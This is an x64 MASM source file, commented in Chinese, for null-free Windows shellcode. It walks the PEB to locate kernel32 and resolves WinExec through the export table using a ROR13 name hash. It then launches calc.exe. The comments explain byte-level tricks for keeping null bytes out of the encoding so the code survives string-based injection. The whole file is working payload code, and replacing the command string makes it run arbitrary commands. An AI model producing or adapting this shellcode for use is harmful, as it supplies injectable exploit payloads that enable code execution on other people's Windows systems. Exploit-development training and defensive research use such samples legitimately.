; calc_nf.asm -- null-free Windows x64 shellcode: WinExec("calc.exe")
; assemble: ml64 /nologo /c /Fo calc_nf.obj calc_nf.asm
;
; null-free 技巧:
;   * 全程 [reg+disp8] 寻址; 裸 [reg] 会编码出 00 字节 -> 用 [reg+rcx] (rcx=0) 代替
;   * 常量 0x88 用寄存器拼 (xor r11d,r11d; mov r11b,88h), 规避 disp32 补零
;   * SW_SHOW 用 inc 生成 (mov edx,1 会产生 00 00 00)
;   * "calc.exe" 用 movabs 直接进寄存器
; 正确性:
;   * 跨 call 保存 rsp 必须用非易失寄存器 rbx (r11 会被 WinExec 破坏)
OPTION CASEMAP:NONE
.code
sc proc
    push    rbx
    push    rsi
    xor     ecx, ecx
    mov     rax, qword ptr gs:[rcx+60h]     ; PEB
    mov     rax, qword ptr [rax+18h]        ; PEB->Ldr
    mov     rax, qword ptr [rax+20h]        ; InMemoryOrderModuleList.Flink (自身)
    mov     rax, qword ptr [rax+rcx]        ; -> ntdll   ([rax+rcx], rcx=0, 避免 00 字节)
    mov     rax, qword ptr [rax+rcx]        ; -> kernel32
    mov     r10, qword ptr [rax+20h]        ; kernel32 DllBase
    mov     eax, dword ptr [r10+3Ch]        ; e_lfanew
    xor     r11d, r11d
    mov     r11b, 88h                       ; r11 = 0x88
    add     rax, r11                        ; e_lfanew + 0x88
    mov     ecx, dword ptr [r10+rax]        ; Export Directory RVA
    add     rcx, r10                        ; &IMAGE_EXPORT_DIRECTORY
    mov     r8, rcx
    mov     r9d, dword ptr [r8+20h]         ; AddressOfNames RVA
    add     r9, r10                         ; AddressOfNames
    mov     r11d, dword ptr [r8+18h]        ; NumberOfNames
    xor     ecx, ecx                        ; i = 0
find:
    mov     esi, dword ptr [r9+rcx*4]       ; AddressOfNames[i]
    add     rsi, r10                        ; -> name
    xor     eax, eax                        ; hash = 0
hl:
    movzx   edx, byte ptr [rsi]
    test    dl, dl
    jz      hashed
    ror     eax, 13
    add     eax, edx
    inc     rsi
    jmp     hl
hashed:
    cmp     eax, 0E8AFE98h                  ; ROR13("WinExec")
    jz      hit
    inc     ecx
    cmp     ecx, r11d
    jb      find
    pop     rsi
    pop     rbx
    ret
hit:
    mov     edx, dword ptr [r8+24h]         ; AddressOfNameOrdinals RVA
    add     rdx, r10
    movzx   edx, word ptr [rdx+rcx*2]       ; ordinal
    mov     eax, dword ptr [r8+1Ch]         ; AddressOfFunctions RVA
    add     rax, r10
    mov     eax, dword ptr [rax+rdx*4]      ; function RVA
    add     rax, r10                        ; -> WinExec
    xor     edx, edx
    push    rdx                             ; 结尾 \0
    mov     rdx, 6578652E636C6163h          ; "calc.exe"
    push    rdx
    mov     rcx, rsp                        ; lpCmdLine
    mov     rbx, rsp                        ; 用非易失 rbx 保存 rsp
    xor     edx, edx
    inc     edx                             ; SW_SHOWNORMAL = 1
    and     rsp, -16                        ; 16 字节对齐
    sub     rsp, 20h                        ; shadow space
    call    rax                             ; WinExec()
    mov     rsp, rbx                        ; 还原栈
    add     rsp, 10h
    pop     rsi
    pop     rbx
    ret
sc endp
END
